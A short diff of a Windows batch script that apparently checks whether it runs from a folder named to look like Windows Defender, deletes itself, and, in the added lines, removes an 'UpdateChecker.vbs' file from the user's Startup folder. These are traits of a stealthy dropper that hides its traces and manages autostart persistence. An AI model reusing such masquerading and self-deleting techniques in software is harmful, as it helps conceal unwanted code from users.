@@ -123,5 +123,8 @@ if %~dp0 NEQ %PROGRAMDATA%\WindowsDefenderSecurity\ (
 del /f /q %~f0
 ))))
 
+if exist "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/UpdateChecker.vbs" (
+del /f /q "%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/UpdateChecker.vbs"
+)
 
 exit
